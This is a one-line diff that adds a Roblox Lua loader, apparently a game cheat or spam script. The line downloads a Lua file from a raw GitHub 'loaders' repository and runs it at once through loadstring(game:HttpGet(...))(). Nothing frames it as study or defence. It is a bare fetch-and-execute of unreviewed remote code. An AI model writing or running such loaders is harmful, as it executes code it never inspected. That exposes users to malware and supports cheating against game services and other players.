@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/kukirin-life-testing-spam7-ekadwotkokp1oy.lua"))()
